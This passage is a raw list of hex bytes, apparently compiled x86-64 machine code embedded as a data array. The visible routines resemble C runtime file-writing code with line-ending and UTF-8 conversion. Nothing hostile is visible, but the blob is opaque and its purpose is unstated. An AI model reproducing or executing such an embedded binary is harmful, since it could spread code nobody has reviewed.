0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xa9, 0x48, 0x81, 0xec, 0xe0, 0x0, 0x0, 0x0, 0x48, 0xc7, 0x45, 0xf7, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x58, 0x8, 0x48, 0x8b, 0x5, 0x70, 0xdb, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0x17, 0x49, 0x8b, 0xf0, 0x4c, 0x89, 0x45, 0xb7, 0x4c, 0x63, 0xf2, 0x48, 0x8b, 0xd9, 0x4c, 0x8b, 0x6d, 0x7f, 0x4c, 0x89, 0x6d, 0xaf, 0x49, 0x8b, 0xce, 0x48, 0x89, 0x4d, 0xe7, 0x49, 0x8b, 0xc6, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x89, 0x45, 0xa7, 0x48, 0x8d, 0x15, 0xfb, 0x49, 0xff, 0xff, 0x83, 0xe1, 0x3f, 0x48, 0x89, 0x4d, 0xef, 0x4c, 0x8d, 0x3c, 0xc9, 0x48, 0x8b, 0x84, 0xc2, 0x30, 0xa3, 0x1, 0x0, 0x4a, 0x8b, 0x44, 0xf8, 0x28, 0x48, 0x89, 0x45, 0xd7, 0x45, 0x8b, 0xe1, 0x4d, 0x3, 0xe0, 0x4c, 0x89, 0x65, 0x8f, 0xff, 0x15, 0x4f, 0x3c, 0x0, 0x0, 0x89, 0x45, 0x9f, 0x33, 0xff, 0x41, 0x38, 0x7d, 0x28, 0x75, 0x8, 0x49, 0x8b, 0xcd, 0xe8, 0x2c, 0xa7, 0xff, 0xff, 0x49, 0x8b, 0x4d, 0x18, 0x44, 0x8b, 0x41, 0xc, 0x44, 0x89, 0x45, 0xa3, 0x33, 0xc0, 0x48, 0x89, 0x3, 0x89, 0x43, 0x8, 0x4c, 0x39, 0x65, 0xb7, 0xf, 0x83, 0xa2, 0x3, 0x0, 0x0, 0x49, 0x8b, 0xc6, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x89, 0x45, 0xdf, 0x8b, 0xd7, 0x8a, 0xe, 0x88, 0x4c, 0x24, 0x40, 0x89, 0x7d, 0x83, 0x41, 0xbc, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x1d, 0x7b, 0x49, 0xff, 0xff, 0x41, 0x81, 0xf8, 0xe9, 0xfd, 0x0, 0x0, 0xf, 0x85, 0x7a, 0x1, 0x0, 0x0, 0x8b, 0xd7, 0x4c, 0x8b, 0xf7, 0x49, 0x8b, 0x84, 0xc3, 0x30, 0xa3, 0x1, 0x0, 0x4e, 0x8d, 0xc, 0xfd, 0x3e, 0x0, 0x0, 0x0, 0x4c, 0x3, 0xc8, 0x49, 0x8b, 0xc1, 0x40, 0x38, 0x38, 0x74, 0xe, 0xff, 0xc2, 0x49, 0xff, 0xc6, 0x48, 0xff, 0xc0, 0x49, 0x83, 0xfe, 0x5, 0x7c, 0xed, 0x4d, 0x85, 0xf6, 0xf, 0x84, 0xd5, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x55, 0xa7, 0x4b, 0x8b, 0x84, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x42, 0xf, 0xb6, 0x4c, 0xf8, 0x3e, 0x46, 0xf, 0xbe, 0xa4, 0x19, 0xf0, 0x99, 0x1, 0x0, 0x41, 0xff, 0xc4, 0x41, 0x8b, 0xc4, 0x2b, 0xc2, 0x89, 0x45, 0x97, 0x48, 0x8b, 0x55, 0x8f, 0x48, 0x2b, 0xd6, 0x4c, 0x63, 0xc0, 0x4c, 0x3b, 0xc2, 0xf, 0x8f, 0x71, 0x2, 0x0, 0x0, 0x48, 0x8b, 0xcf, 0x41, 0x8a, 0x1, 0x88, 0x44, 0xd, 0xff, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc1, 0x49, 0x3b, 0xce, 0x7c, 0xee, 0x4d, 0x85, 0xc0, 0x7e, 0x1a, 0x48, 0x8d, 0x4d, 0xff, 0x49, 0x3, 0xce, 0x48, 0x8b, 0xd6, 0xe8, 0x65, 0x66, 0xff, 0xff, 0x4c, 0x8b, 0x55, 0xa7, 0x4c, 0x8d, 0x1d, 0xca, 0x48, 0xff, 0xff, 0x48, 0x8b, 0xd7, 0x4b, 0x8b, 0x8c, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x48, 0x3, 0xca, 0x42, 0x88, 0x7c, 0xf9, 0x3e, 0x48, 0xff, 0xc2, 0x49, 0x3b, 0xd6, 0x7c, 0xe8, 0x48, 0x89, 0x7d, 0xbf, 0x48, 0x8d, 0x45, 0xff, 0x48, 0x89, 0x45, 0xc7, 0x8b, 0xc7, 0x41, 0x83, 0xfc, 0x4, 0xf, 0x94, 0xc0, 0xff, 0xc0, 0x44, 0x8b, 0xe0, 0x44, 0x8b, 0xc0, 0x4c, 0x89, 0x6c, 0x24, 0x20, 0x4c, 0x8d, 0x4d, 0xbf, 0x48, 0x8d, 0x55, 0xc7, 0x48, 0x8d, 0x4d, 0x83, 0xe8, 0xc, 0xc, 0x0, 0x0, 0x48, 0x83, 0xf8, 0xff, 0xf, 0x84, 0x76, 0x2, 0x0, 0x0, 0x8b, 0x45, 0x97, 0xff, 0xc8, 0x48, 0x63, 0xc8, 0x48, 0x3, 0xf1, 0xe9, 0x3, 0x1, 0x0, 0x0, 0xf, 0xb6, 0x6, 0x4e, 0xf, 0xbe, 0xac, 0x18, 0xf0, 0x99, 0x1, 0x0, 0x41, 0x8d, 0x4d, 0x1, 0x4c, 0x8b, 0x45, 0x8f, 0x4c, 0x2b, 0xc6, 0x48, 0x63, 0xc1, 0x49, 0x3b, 0xc0, 0xf, 0x8f, 0xe0, 0x1, 0x0, 0x0, 0x48, 0x89, 0x7d, 0x97, 0x48, 0x89, 0x75, 0xcf, 0x8b, 0xc7, 0x83, 0xf9, 0x4, 0xf, 0x94, 0xc0, 0xff, 0xc0, 0x44, 0x8b, 0xf0, 0x44, 0x8b, 0xc0, 0x48, 0x8b, 0x45, 0xaf, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, 0x4d, 0x97, 0x48, 0x8d, 0x55, 0xcf, 0x48, 0x8d, 0x4d, 0x83, 0xe8, 0x9d, 0xb, 0x0, 0x0, 0x48, 0x83, 0xf8, 0xff, 0xf, 0x84, 0x7, 0x2, 0x0, 0x0, 0x49, 0x3, 0xf5, 0x45, 0x8b, 0xe6, 0x4c, 0x8b, 0x6d, 0xaf, 0xe9, 0x95, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x55, 0xa7, 0x4f, 0x8b, 0x8c, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x43, 0x8a, 0x4c, 0xf9, 0x3d, 0xf6, 0xc1, 0x4, 0x74, 0x21, 0x43, 0x8a, 0x44, 0xf9, 0x3e, 0x88, 0x45, 0x7, 0x8a, 0x6, 0x88, 0x45, 0x8, 0x80, 0xe1, 0xfb, 0x43, 0x88, 0x4c, 0xf9, 0x3d, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x55, 0x7, 0xeb, 0x49, 0x44, 0xf, 0xb6, 0x6, 0x49, 0x8b, 0x45, 0x18, 0x48, 0x8b, 0x8, 0x66, 0x42, 0x39, 0x3c, 0x41, 0x7d, 0x31, 0x4c, 0x8d, 0x76, 0x1, 0x4c, 0x3b, 0x75, 0x8f, 0xf, 0x83, 0x7c, 0x1, 0x0, 0x0, 0x4d, 0x8b, 0xcd, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd6, 0x48, 0x8d, 0x4d, 0x83, 0xe8, 0xb0, 0xe1, 0xff, 0xff, 0x83, 0xf8, 0xff, 0xf, 0x84, 0x83, 0x1, 0x0, 0x0, 0x49, 0x8b, 0xf6, 0xeb, 0x1b, 0x4d, 0x8b, 0xc4, 0x48, 0x8b, 0xd6, 0x4d, 0x8b, 0xcd, 0x48, 0x8d, 0x4d, 0x83, 0xe8, 0x90, 0xe1, 0xff, 0xff, 0x83, 0xf8, 0xff, 0xf, 0x84, 0x63, 0x1, 0x0, 0x0, 0x48, 0xff, 0xc6, 0x48, 0x89, 0x7c, 0x24, 0x38, 0x48, 0x89, 0x7c, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x28, 0x5, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x45, 0xf, 0x48, 0x89, 0x44, 0x24, 0x20, 0x45, 0x8b, 0xcc, 0x4c, 0x8d, 0x45, 0x83, 0x33, 0xd2, 0x8b, 0x4d, 0x9f, 0xe8, 0xe8, 0xcc, 0xff, 0xff, 0x44, 0x8b, 0xf0, 0x85, 0xc0, 0xf, 0x84, 0x29, 0x1, 0x0, 0x0, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x4c, 0x8d, 0x4d, 0x87, 0x44, 0x8b, 0xc0, 0x48, 0x8d, 0x55, 0xf, 0x4c, 0x8b, 0x65, 0xd7, 0x49, 0x8b, 0xcc, 0xff, 0x15, 0x80, 0x39, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0xfc, 0x0, 0x0, 0x0, 0x8b, 0xd6, 0x2b, 0x55, 0xb7, 0x3, 0x53, 0x8, 0x89, 0x53, 0x4, 0x44, 0x39, 0x75, 0x87, 0xf, 0x82, 0xef, 0x0, 0x0, 0x0, 0x80, 0x7c, 0x24, 0x40, 0xa, 0x75, 0x40, 0xb8, 0xd, 0x0, 0x0, 0x0, 0x66, 0x89, 0x44, 0x24, 0x40, 0x48, 0x89, 0x7c, 0x24, 0x20, 0x4c, 0x8d, 0x4d, 0x87, 0x44, 0x8d, 0x40, 0xf4, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x49, 0x8b, 0xcc, 0xff, 0x15, 0x37, 0x39, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0xb3, 0x0, 0x0, 0x0, 0x83, 0x7d, 0x87, 0x1, 0xf, 0x82, 0xb1, 0x0, 0x0, 0x0, 0xff, 0x43, 0x8, 0xff, 0x43, 0x4, 0x8b, 0x53, 0x4, 0x48, 0x3b, 0x75, 0x8f, 0xf, 0x83, 0x9e, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xdf, 0x44, 0x8b, 0x45, 0xa3, 0xe9, 0xfc, 0xfc, 0xff, 0xff, 0x48, 0x85, 0xd2, 0x7e, 0x24, 0x49, 0x2b, 0xf6, 0x4b, 0x8b, 0x8c, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x49, 0x3, 0xce, 0x42, 0x8a, 0x4, 0x36, 0x42, 0x88, 0x44, 0xf9, 0x3e, 0xff, 0xc7, 0x49, 0xff, 0xc6, 0x48, 0x63, 0xc7, 0x48, 0x3b, 0xc2, 0x7c, 0xdf, 0x1, 0x53, 0x4, 0xeb, 0x63, 0x4d, 0x85, 0xc0, 0x7e, 0x33, 0x48, 0x8b, 0xd7, 0x4c, 0x8b, 0x55, 0xe7, 0x49, 0xc1, 0xfa, 0x6, 0x48, 0x8b, 0x45, 0xef, 0x4c, 0x8d, 0xc, 0xc0, 0x4b, 0x8b, 0x84, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x4a, 0x8d, 0xc, 0xc8, 0x8a, 0x4, 0x32, 0x88, 0x44, 0x11, 0x3e, 0xff, 0xc7, 0x48, 0xff, 0xc2, 0x48, 0x63, 0xc7, 0x49, 0x3b, 0xc0, 0x7c, 0xe0, 0x44, 0x1, 0x43, 0x4, 0xeb, 0x25, 0x8a, 0x6, 0x43, 0x88, 0x44, 0xf9, 0x3e, 0x4b, 0x8b, 0x84, 0xd3, 0x30, 0xa3, 0x1, 0x0, 0x42, 0x80, 0x4c, 0xf8, 0x3d, 0x4, 0x8d, 0x42, 0x1, 0x89, 0x43, 0x4, 0xeb, 0x8, 0xff, 0x15, 0xee, 0x36, 0x0, 0x0, 0x89, 0x3, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x4d, 0x17, 0x48, 0x33, 0xcc, 0xe8, 0x9d, 0x25, 0x0, 0x0, 0x48, 0x8b, 0x9c, 0x24, 0x20, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xe0, 0x0, 0x0, 0x0, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x56, 0xb8, 0x50, 0x14, 0x0, 0x0, 0xe8, 0x48, 0x28, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8b, 0x5, 0xee, 0xd6, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x84, 0x24, 0x40, 0x14, 0x0, 0x0, 0x4c, 0x63, 0xd2, 0x48, 0x8b, 0xf9, 0x49, 0x8b, 0xc2, 0x41, 0x8b, 0xe9, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xd, 0xbc, 0xe8, 0x0, 0x0, 0x41, 0x83, 0xe2, 0x3f, 0x49, 0x3, 0xe8, 0x49, 0x8b, 0xf0, 0x48, 0x8b, 0x4, 0xc1, 0x4b, 0x8d, 0x14, 0xd2, 0x4c, 0x8b, 0x74, 0xd0, 0x28, 0x33, 0xc0, 0x48, 0x89, 0x7, 0x89, 0x47, 0x8, 0x4c, 0x3b, 0xc5, 0x73, 0x6f, 0x48, 0x8d, 0x5c, 0x24, 0x40, 0x48, 0x3b, 0xf5, 0x73, 0x24, 0x8a, 0x6, 0x48, 0xff, 0xc6, 0x3c, 0xa, 0x75, 0x9, 0xff, 0x47, 0x8, 0xc6, 0x3, 0xd, 0x48, 0xff, 0xc3, 0x88, 0x3, 0x48, 0xff, 0xc3, 0x48, 0x8d, 0x84, 0x24, 0x3f, 0x14, 0x0, 0x0, 0x48, 0x3b, 0xd8, 0x72, 0xd7, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x2b, 0xd8, 0x4c, 0x8d, 0x4c, 0x24, 0x30, 0x44, 0x8b, 0xc3, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x49, 0x8b, 0xce, 0xff, 0x15, 0x8f, 0x37, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x8b, 0x44, 0x24, 0x30, 0x1, 0x47, 0x4, 0x3b, 0xc3, 0x72, 0xf, 0x48, 0x3b, 0xf5, 0x72, 0x9b, 0xeb, 0x8, 0xff, 0x15, 0xeb, 0x35, 0x0, 0x0, 0x89, 0x7, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x8c, 0x24, 0x40, 0x14, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x96, 0x24, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0x50, 0x14, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x20, 0x49, 0x8b, 0x6b, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x56, 0xb8, 0x50, 0x14, 0x0, 0x0, 0xe8, 0x44, 0x27, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8b, 0x5, 0xea, 0xd5, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x84, 0x24, 0x40, 0x14, 0x0, 0x0, 0x4c, 0x63, 0xd2, 0x48, 0x8b, 0xf9, 0x49, 0x8b, 0xc2, 0x41, 0x8b, 0xe9, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xd, 0xb8, 0xe7, 0x0, 0x0, 0x41, 0x83, 0xe2, 0x3f, 0x49, 0x3, 0xe8, 0x49, 0x8b, 0xf0, 0x48, 0x8b, 0x4, 0xc1, 0x4b, 0x8d, 0x14, 0xd2, 0x4c, 0x8b, 0x74, 0xd0, 0x28, 0x33, 0xc0, 0x48, 0x89, 0x7, 0x89, 0x47, 0x8, 0x4c, 0x3b, 0xc5, 0xf, 0x83, 0x82, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x5c, 0x24, 0x40, 0x48, 0x3b, 0xf5, 0x73, 0x31, 0xf, 0xb7, 0x6, 0x48, 0x83, 0xc6, 0x2, 0x66, 0x83, 0xf8, 0xa, 0x75, 0x10, 0x83, 0x47, 0x8, 0x2, 0xb9, 0xd, 0x0, 0x0, 0x0, 0x66, 0x89, 0xb, 0x48, 0x83, 0xc3, 0x2, 0x66, 0x89, 0x3, 0x48, 0x83, 0xc3, 0x2, 0x48, 0x8d, 0x84, 0x24, 0x3e, 0x14, 0x0, 0x0, 0x48, 0x3b, 0xd8, 0x72, 0xca, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x48, 0x2b, 0xd8, 0x4c, 0x8d, 0x4c, 0x24, 0x30, 0x48, 0xd1, 0xfb, 0x48, 0x8d, 0x54, 0x24, 0x40, 0x3, 0xdb, 0x49, 0x8b, 0xce, 0x44, 0x8b, 0xc3, 0xff, 0x15, 0x74, 0x36, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x12, 0x8b, 0x44, 0x24, 0x30, 0x1, 0x47, 0x4, 0x3b, 0xc3, 0x72, 0xf, 0x48, 0x3b, 0xf5, 0x72, 0x88, 0xeb, 0x8, 0xff, 0x15, 0xd0, 0x34, 0x0, 0x0, 0x89, 0x7, 0x48, 0x8b, 0xc7, 0x48, 0x8b, 0x8c, 0x24, 0x40, 0x14, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x7b, 0x23, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0x50, 0x14, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x20, 0x49, 0x8b, 0x6b, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0xb8, 0x70, 0x14, 0x0, 0x0, 0xe8, 0x24, 0x26, 0x0, 0x0, 0x48, 0x2b, 0xe0, 0x48, 0x8b, 0x5, 0xca, 0xd4, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x84, 0x24, 0x60, 0x14, 0x0, 0x0, 0x4c, 0x63, 0xd2, 0x48, 0x8b, 0xd9, 0x49, 0x8b, 0xc2, 0x45, 0x8b, 0xf1, 0x48, 0xc1, 0xf8, 0x6, 0x48, 0x8d, 0xd, 0x98, 0xe6, 0x0, 0x0, 0x41, 0x83, 0xe2, 0x3f, 0x4d, 0x3, 0xf0, 0x4d, 0x8b, 0xf8, 0x49, 0x8b, 0xf8, 0x48, 0x8b, 0x4, 0xc1, 0x4b, 0x8d, 0x14, 0xd2, 0x4c, 0x8b, 0x64, 0xd0, 0x28, 0x33, 0xc0, 0x48, 0x89, 0x3, 0x4d, 0x3b, 0xc6, 0x89, 0x43, 0x8, 0xf, 0x83, 0xce, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x50, 0x49, 0x3b, 0xfe, 0x73, 0x2d, 0xf, 0xb7, 0xf, 0x48, 0x83, 0xc7, 0x2, 0x66, 0x83, 0xf9, 0xa, 0x75, 0xc, 0xba, 0xd, 0x0, 0x0, 0x0, 0x66, 0x89, 0x10, 0x48, 0x83, 0xc0, 0x2, 0x66, 0x89, 0x8, 0x48, 0x83, 0xc0, 0x2, 0x48, 0x8d, 0x8c, 0x24, 0xf8, 0x6, 0x0, 0x0, 0x48, 0x3b, 0xc1, 0x72, 0xce, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x4c, 0x8d, 0x44, 0x24, 0x50, 0x48, 0x2b, 0xc1, 0xc7, 0x44, 0x24, 0x28, 0x55, 0xd, 0x0, 0x0, 0x48, 0x8d, 0x8c, 0x24, 0x0, 0x7, 0x0, 0x0, 0x48, 0xd1, 0xf8, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x44, 0x8b, 0xc8, 0xb9, 0xe9, 0xfd, 0x0, 0x0, 0x33, 0xd2, 0xe8, 0x7e, 0xc8, 0xff, 0xff, 0x8b, 0xe8, 0x85, 0xc0, 0x74, 0x49, 0x33, 0xf6, 0x85, 0xc0, 0x74, 0x33, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x48, 0x8d, 0x94, 0x24, 0x0, 0x7, 0x0, 0x0, 0x8b, 0xce, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0x44, 0x8b, 0xc5, 0x48, 0x3, 0xd1, 0x49, 0x8b, 0xcc, 0x44, 0x2b, 0xc6, 0xff, 0x15, 0xb, 0x35, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x18, 0x3, 0x74, 0x24, 0x40, 0x3b, 0xf5, 0x72, 0xcd, 0x8b, 0xc7, 0x41, 0x2b, 0xc7, 0x89, 0x43, 0x4, 0x49, 0x3b, 0xfe, 0xe9, 0x34, 0xff, 0xff, 0xff, 0xff, 0x15, 0x61, 0x33, 0x0, 0x0, 0x89, 0x3, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x8c, 0x24, 0x60, 0x14, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0xc, 0x22, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0x70, 0x14, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x30, 0x49, 0x8b, 0x6b, 0x40, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x78, 0x18, 0x4c, 0x89, 0x60, 0x20, 0x89, 0x48, 0x8, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x49, 0x8b, 0xd9, 0x45, 0x8b, 0xe0, 0x4c, 0x8b, 0xea, 0x48, 0x63, 0xf9, 0x83, 0xff, 0xfe, 0x75, 0x1c, 0x41, 0xc6, 0x41, 0x38, 0x1, 0x41, 0x83, 0x61, 0x34, 0x0, 0x41, 0xc6, 0x41, 0x30, 0x1, 0x41, 0xc7, 0x41, 0x2c, 0x9, 0x0, 0x0, 0x0, 0xe9, 0xbf, 0x0, 0x0, 0x0, 0x85, 0xc9, 0xf, 0x88, 0x86, 0x0, 0x0, 0x0, 0x3b, 0x3d, 0x19, 0xe9, 0x0, 0x0, 0x73, 0x7e, 0x48, 0x8b, 0xc7, 0x4c, 0x8b, 0xff, 0x49, 0xc1, 0xef, 0x6, 0x48, 0x8d, 0x15, 0x6, 0xe5, 0x0, 0x0, 0x83, 0xe0, 0x3f, 0x48, 0x8d, 0xc, 0xc0, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4a, 0x8b, 0x4, 0xfa, 0xf6, 0x44, 0xc8, 0x38, 0x1, 0x74, 0x56, 0x8b, 0xcf, 0xe8, 0xb8, 0xf4, 0xff, 0xff, 0x41, 0x83, 0xce, 0xff, 0x48, 0x8d, 0x5, 0xdd, 0xe4, 0x0, 0x0, 0x4a, 0x8b, 0x4, 0xf8, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0xf6, 0x44, 0xc8, 0x38, 0x1, 0x75, 0x15, 0xc6, 0x43, 0x30, 0x1, 0xc7, 0x43, 0x2c, 0x9, 0x0, 0x0, 0x0, 0xc6, 0x43, 0x38, 0x1, 0x83, 0x63, 0x34, 0x0, 0xeb, 0x13, 0x4c, 0x8b, 0xcb, 0x45, 0x8b, 0xc4, 0x49, 0x8b, 0xd5, 0x8b, 0xcf, 0xe8, 0x60, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xf0, 0x8b, 0xcf, 0xe8, 0x96, 0xf4, 0xff, 0xff, 0x41, 0x8b, 0xc6, 0xeb, 0x34, 0x48, 0x89, 0x5c, 0x24, 0x28, 0x41, 0xc6, 0x41, 0x38, 0x1, 0x41, 0x83, 0x61, 0x34, 0x0, 0x41, 0xc6, 0x41, 0x30, 0x1, 0x41, 0xc7, 0x41, 0x2c, 0x9, 0x0, 0x0, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xe8, 0xb4, 0xaa, 0xff, 0xff, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x68, 0x48, 0x8b, 0x7c, 0x24, 0x70, 0x4c, 0x8b, 0x64, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x68, 0x33, 0xff, 0x45, 0x8b, 0xf8, 0x4c, 0x63, 0xe1, 0x49, 0x8b, 0xd9, 0x4c, 0x8b, 0xf2, 0x45, 0x85, 0xc0, 0xf, 0x84, 0xd2, 0x2, 0x0, 0x0, 0x48, 0x85, 0xd2, 0x75, 0x37, 0x41, 0xc6, 0x41, 0x38, 0x1, 0x45, 0x33, 0xc0, 0x41, 0x89, 0x79, 0x34, 0x33, 0xd2, 0x41, 0xc6, 0x41, 0x30, 0x1, 0x33, 0xc9, 0x41, 0xc7, 0x41, 0x2c, 0x16, 0x0, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x48, 0x89, 0x5c, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x35, 0xaa, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xe9, 0x98, 0x2, 0x0, 0x0, 0x49, 0x8b, 0xc4, 0x48, 0x8d, 0x15, 0xd7, 0xe3, 0x0, 0x0, 0x83, 0xe0, 0x3f, 0x49, 0x8b, 0xcc, 0x48, 0xc1, 0xf9, 0x6, 0x48, 0x89, 0x4d, 0xc8, 0x4c, 0x8d, 0x2c, 0xc0, 0x48, 0x8b, 0xc, 0xca, 0x42, 0xf, 0xbe, 0x74, 0xe9, 0x39, 0x8d, 0x46, 0xff, 0x3c, 0x1, 0x77, 0x9, 0x41, 0x8b, 0xc7, 0xf7, 0xd0, 0xa8, 0x1, 0x74, 0x93, 0x42, 0xf6, 0x44, 0xe9, 0x38, 0x20, 0x74, 0xe, 0x33, 0xd2, 0x41, 0x8b, 0xcc, 0x44, 0x8d, 0x42, 0x2, 0xe8, 0x65, 0x9, 0x0, 0x0, 0x41, 0x8b, 0xcc, 0x48, 0x89, 0x7d, 0xe0, 0xe8, 0x45, 0x3, 0x0, 0x0, 0x48, 0x8b, 0x55, 0xc8, 0x4c, 0x8d, 0x5, 0x7e, 0xe3, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0x17, 0x1, 0x0, 0x0, 0x49, 0x8b, 0x4, 0xd0, 0x42, 0x38, 0x7c, 0xe8, 0x38, 0xf, 0x8d, 0x8, 0x1, 0x0, 0x0, 0x40, 0x38, 0x7b, 0x28, 0x75, 0x13, 0x48, 0x8b, 0xcb, 0xe8, 0x99, 0x9d, 0xff, 0xff, 0x48, 0x8b, 0x55, 0xc8, 0x4c, 0x8d, 0x5, 0x4e, 0xe3, 0x0, 0x0, 0x48, 0x8b, 0x43, 0x18, 0x48, 0x39, 0xb8, 0x38, 0x1, 0x0, 0x0, 0x75, 0xf, 0x49, 0x8b, 0x4, 0xd0, 0x42, 0x38, 0x7c, 0xe8, 0x39, 0xf, 0x84, 0xd3, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xc, 0xd0, 0x48, 0x8d, 0x55, 0xf0, 0x4a, 0x8b, 0x4c, 0xe9, 0x28, 0xff, 0x15, 0x77, 0x32, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0xad, 0x0, 0x0, 0x0, 0x40, 0x84, 0xf6, 0xf, 0x84, 0x81, 0x0, 0x0, 0x0, 0x40, 0xfe, 0xce, 0x40, 0x80, 0xfe, 0x1, 0xf, 0x87, 0x3b, 0x1, 0x0, 0x0, 0x4f, 0x8d, 0x24, 0x3e, 0x48, 0x89, 0x7d, 0xd0, 0x4d, 0x8b, 0xfe, 0x4d, 0x3b, 0xf4, 0xf, 0x83, 0x1d, 0x1, 0x0, 0x0, 0x8b, 0x75, 0xd4, 0x41, 0xf, 0xb7, 0x7, 0xf, 0xb7, 0xc8, 0x66, 0x89, 0x45, 0xf0, 0xe8, 0xb2, 0x8, 0x0, 0x0, 0xf, 0xb7, 0x4d, 0xf0, 0x66, 0x3b, 0xc1, 0x75, 0x36, 0x83, 0xc6, 0x2, 0x89, 0x75, 0xd4, 0x66, 0x83, 0xf9, 0xa, 0x75, 0x1b, 0xb9, 0xd, 0x0, 0x0, 0x0, 0xe8, 0x93, 0x8, 0x0, 0x0, 0xb9, 0xd, 0x0, 0x0, 0x0, 0x66, 0x3b, 0xc1, 0x75, 0x16, 0xff, 0xc6, 0x89, 0x75, 0xd4, 0xff, 0xc7, 0x49, 0x83, 0xc7, 0x2, 0x4d, 0x3b, 0xfc, 0xf, 0x83, 0xcd, 0x0, 0x0, 0x0, 